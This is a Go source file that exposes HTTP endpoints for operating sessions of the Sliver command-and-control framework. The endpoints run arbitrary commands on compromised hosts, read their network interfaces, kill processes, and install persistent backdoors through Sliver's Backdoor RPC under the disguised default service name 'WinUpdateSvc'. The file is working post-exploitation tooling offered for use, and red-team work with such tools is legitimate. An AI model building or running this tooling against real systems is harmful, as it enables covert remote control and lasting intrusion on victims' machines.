package main

import (
	"context"
	"net/http"
	"time"

	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

func (s *Server) exec(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	var body struct {
		Path   string   `json:"path"`
		Args   []string `json:"args"`
		Output bool     `json:"output"`
	}
	if err := decode(r, &body); err != nil {
		writeErr(w, http.StatusBadRequest, err.Error())
		return
	}
	if body.Path == "" {
		body.Path = "sh"
	}
	client, err := s.mgr.Client()
	if err != nil {
		writeErr(w, http.StatusServiceUnavailable, err.Error())
		return
	}
	ctx, cancel := context.WithTimeout(r.Context(), 60*time.Second)
	defer cancel()
	resp, err := client.Execute(ctx, &sliverpb.ExecuteReq{
		Path:    body.Path,
		Args:    body.Args,
		Output:  true,
		Request: &commonpb.Request{SessionID: id},
	})
	if err != nil {
		writeErr(w, http.StatusBadGateway, err.Error())
		return
	}
	if resp.Response != nil && resp.Response.Err != "" {
		writeErr(w, http.StatusBadGateway, resp.Response.Err)
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{
		"status": resp.Status,
		"stdout": string(resp.Stdout),
		"stderr": string(resp.Stderr),
		"pid":    resp.Pid,
	})
}

// persist installs unattended persistence on the target using Sliver's Backdoor
// RPC (Windows: an auto-start service; other OSes: the platform equivalent).
func (s *Server) persist(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	var body struct {
		FilePath    string `json:"file_path"`
		ProfileName string `json:"profile_name"`
		Name        string `json:"name"`
	}
	if err := decode(r, &body); err != nil {
		writeErr(w, http.StatusBadRequest, err.Error())
		return
	}
	if body.Name == "" {
		body.Name = "WinUpdateSvc"
	}
	client, err := s.mgr.Client()
	if err != nil {
		writeErr(w, http.StatusServiceUnavailable, err.Error())
		return
	}
	s.mgr.Begin()
	defer s.mgr.End()
	ctx, cancel := context.WithTimeout(r.Context(), 90*time.Second)
	defer cancel()
	resp, err := client.Backdoor(ctx, &clientpb.BackdoorReq{
		FilePath:    body.FilePath,
		ProfileName: body.ProfileName,
		Name:        body.Name,
		Request:     &commonpb.Request{SessionID: id},
	})
	if err != nil {
		writeErr(w, http.StatusBadGateway, err.Error())
		return
	}
	if resp.Response != nil && resp.Response.Err != "" {
		writeErr(w, http.StatusBadGateway, resp.Response.Err)
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"ok": true, "name": body.Name})
}

func (s *Server) ifconfig(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	client, err := s.mgr.Client()
	if err != nil {
		writeErr(w, http.StatusServiceUnavailable, err.Error())
		return
	}
	ctx, cancel := context.WithTimeout(r.Context(), 15*time.Second)
	defer cancel()
	resp, err := client.Ifconfig(ctx, &sliverpb.IfconfigReq{Request: &commonpb.Request{SessionID: id}})
	if err != nil {
		writeErr(w, http.StatusBadGateway, err.Error())
		return
	}
	ifaces := make([]map[string]any, 0, len(resp.NetInterfaces))
	for _, in := range resp.NetInterfaces {
		ifaces = append(ifaces, map[string]any{
			"index": in.Index,
			"name":  in.Name,
			"mac":   in.MAC,
			"ips":   in.IPAddresses,
		})
	}
	writeJSON(w, http.StatusOK, map[string]any{"interfaces": ifaces})
}

func (s *Server) kill(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	var body struct {
		PID   int32 `json:"pid"`
		Force bool  `json:"force"`
	}
	if err := decode(r, &body); err != nil {
		writeErr(w, http.StatusBadRequest, err.Error())
		return
	}
	client, err := s.mgr.Client()
	if err != nil {
		writeErr(w, http.StatusServiceUnavailable, err.Error())
		return
	}
	ctx, cancel := context.WithTimeout(r.Context(), 15*time.Second)
	defer cancel()
	resp, err := client.Terminate(ctx, &sliverpb.TerminateReq{
		Pid:     body.PID,
		Force:   body.Force,
		Request: &commonpb.Request{SessionID: id},
	})
	if err != nil {
		writeErr(w, http.StatusBadGateway, err.Error())
		return
	}
	if resp.Response != nil && resp.Response.Err != "" {
		writeErr(w, http.StatusBadGateway, resp.Response.Err)
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"ok": true, "pid": resp.Pid})
}
